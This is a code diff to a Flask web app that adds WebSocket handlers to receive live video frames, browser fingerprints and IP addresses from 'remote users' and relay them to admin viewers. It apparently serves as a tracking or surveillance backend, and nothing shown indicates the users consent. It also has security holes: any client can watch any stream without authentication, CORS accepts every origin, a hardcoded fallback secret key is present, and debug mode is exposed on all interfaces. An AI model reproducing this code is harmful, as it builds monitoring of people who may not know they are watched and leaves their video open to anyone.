@@ -1,5 +1,6 @@
 from flask import Flask, request, jsonify, render_template, session, redirect, url_for
 from flask_cors import CORS
+from flask_socketio import SocketIO, emit, join_room, leave_room
 from datetime import datetime
 import sqlite3
 import hashlib
@@ -11,6 +12,7 @@ from werkzeug.utils import secure_filename
 app = Flask(__name__)
 app.secret_key = os.environ.get('SECRET_KEY', 'ed09a8f63982882c3ce5bb2897d1d9d3')
 CORS(app)
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
 
 # Database setup
 DB_PATH = 'user_data.db'
@@ -847,5 +849,93 @@ def serve_photo(filename):
     from flask import send_from_directory
     return send_from_directory(PHOTOS_FOLDER, filename)
 
+# WebSocket handlers for live video streaming
+# Store active video streams: {entry_id: {socket_id: sid, fingerprint: fp, ip: ip}}
+active_streams = {}
+
+@socketio.on('connect')
+def handle_connect():
+    """Handle WebSocket connection"""
+    print(f"[WEBSOCKET] Client connected: {request.sid}")
+
+@socketio.on('disconnect')
+def handle_disconnect():
+    """Handle WebSocket disconnection"""
+    print(f"[WEBSOCKET] Client disconnected: {request.sid}")
+    # Remove from active streams
+    for entry_id, stream_info in list(active_streams.items()):
+        if stream_info.get('socket_id') == request.sid:
+            del active_streams[entry_id]
+            print(f"[WEBSOCKET] Removed stream for entry {entry_id}")
+
+@socketio.on('start_video_stream')
+def handle_start_stream(data):
+    """Start video streaming from remote user"""
+    entry_id = data.get('entry_id')
+    fingerprint = data.get('fingerprint', '')
+    ip_address = data.get('ip_address', '')
+    
+    if entry_id:
+        active_streams[entry_id] = {
+            'socket_id': request.sid,
+            'fingerprint': fingerprint,
+            'ip_address': ip_address,
+            'started_at': datetime.now().isoformat()
+        }
+        join_room(f'stream_{entry_id}')
+        print(f"[WEBSOCKET] Started video stream for entry {entry_id} from {ip_address}")
+        emit('stream_started', {'entry_id': entry_id, 'status': 'success'})
+    else:
+        emit('stream_error', {'error': 'Entry ID required'})
+
+@socketio.on('video_frame')
+def handle_video_frame(data):
+    """Receive video frame from remote user and broadcast to admin viewers"""
+    entry_id = data.get('entry_id')
+    frame_data = data.get('frame')  # Base64 encoded image
+    
+    if entry_id and frame_data:
+        # Broadcast frame to all admin viewers watching this stream
+        emit('video_frame', {
+            'entry_id': entry_id,
+            'frame': frame_data,
+            'timestamp': datetime.now().isoformat()
+        }, room=f'viewer_{entry_id}', include_self=False)
+    else:
+        emit('stream_error', {'error': 'Invalid frame data'})
+
+@socketio.on('watch_stream')
+def handle_watch_stream(data):
+    """Admin wants to watch a specific user's video stream"""
+    entry_id = data.get('entry_id')
+    
+    if entry_id:
+        join_room(f'viewer_{entry_id}')
+        print(f"[WEBSOCKET] Admin viewer joined stream for entry {entry_id}")
+        emit('watching_stream', {
+            'entry_id': entry_id,
+            'is_active': entry_id in active_streams
+        })
+    else:
+        emit('stream_error', {'error': 'Entry ID required'})
+
+@socketio.on('stop_watching')
+def handle_stop_watching(data):
+    """Admin stops watching a stream"""
+    entry_id = data.get('entry_id')
+    if entry_id:
+        leave_room(f'viewer_{entry_id}')
+        print(f"[WEBSOCKET] Admin viewer left stream for entry {entry_id}")
+
+@socketio.on('stop_stream')
+def handle_stop_stream(data):
+    """Remote user stops streaming"""
+    entry_id = data.get('entry_id')
+    if entry_id and entry_id in active_streams:
+        del active_streams[entry_id]
+        leave_room(f'stream_{entry_id}')
+        print(f"[WEBSOCKET] Stopped video stream for entry {entry_id}")
+        emit('stream_stopped', {'entry_id': entry_id})
+
 if __name__ == '__main__':
-    app.run(debug=True, host='0.0.0.0', port=5000)
+    socketio.run(app, debug=True, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)
